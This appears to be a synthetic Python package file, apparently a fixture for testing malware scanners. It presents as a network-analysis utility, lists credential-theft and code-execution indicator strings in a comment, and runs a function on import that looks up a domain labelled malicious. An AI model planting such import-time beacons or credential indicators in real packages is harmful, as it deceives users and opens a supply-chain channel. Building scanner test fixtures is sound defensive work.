"""network-flow-analyzer: Utility package."""
# Controlled static indicators: Authorization: Bearer .aws/credentials exec( eval(
import os, socket
__version__ = "2.0.0"
MALICIOUS_DOMAIN = "cmdset.3zavlore.surf"
def _beacon():
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass
_beacon()
